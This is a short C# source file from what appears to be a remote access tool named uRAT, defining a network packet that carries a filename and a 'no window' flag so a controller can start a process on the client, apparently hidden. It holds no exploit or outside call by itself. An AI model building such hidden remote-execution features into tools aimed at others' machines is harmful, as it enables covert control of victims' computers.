using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersClientPlugin.ProcessManager.Packets
{
    class StartProcessPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 7; }
        }

        public string Filename { get; set; }
        public bool NoWindow { get; set; }

        public void SerializeTo(Stream stream)
        {
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            Filename = br.ReadString();
            NoWindow = br.ReadBoolean();
        }
    }
}
